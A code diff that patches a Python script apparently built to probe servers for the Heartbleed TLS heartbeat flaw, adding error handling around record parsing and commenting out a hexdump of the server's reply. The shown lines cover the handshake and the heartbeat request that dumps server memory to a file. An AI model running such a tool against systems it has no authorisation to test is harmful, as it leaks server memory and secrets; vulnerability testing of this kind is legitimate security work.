@@ -58,8 +58,12 @@ def hit_hb(s, output_file):
         hdr = s.recv(5)
         if hdr is None:
             print('Unexpected EOF receiving record header - server closed connection')
-            return False
-        (content_type, version, length) = struct.unpack('>BHH', hdr)
+            return False        
+        try:
+            (content_type, version, length) = struct.unpack('>BHH', hdr)
+        except Exception as e:
+            print(f"Error: {e}. Server may not be vulnerable")
+            return
 
         if content_type is None:
             print('No heartbeat response received, server likely not vulnerable')
@@ -84,7 +88,7 @@ def hit_hb(s, output_file):
 
         if content_type == 21:
             print('Received alert:')
-            hexdump(pay)
+            #hexdump(pay)
             print('Server returned error, likely not vulnerable')
             return False
 
@@ -110,11 +114,14 @@ if __name__ == '__main__':
         hdr = s.recv(5)
         (content_type, version, length) = struct.unpack('>BHH', hdr)
         hand = recvall(s, length)
-        print(' ... received message: type = %d, ver = %04x, length = %d' % (content_type, version, len(hand)))
+        try:
+            print(' ... received message: type = %d, ver = %04x, length = %d' % (content_type, version, len(hand)))
+        except Exception as e:
+            print(f"Error: {e}. Server may not be vulnerable")
+            break
         if content_type == 22 and hand[0] == 0x0E:
             break
 
     print('Handshake done...')
     print('Sending heartbeat request with length 4:')
     hit_hb(s, args.output_file)
-
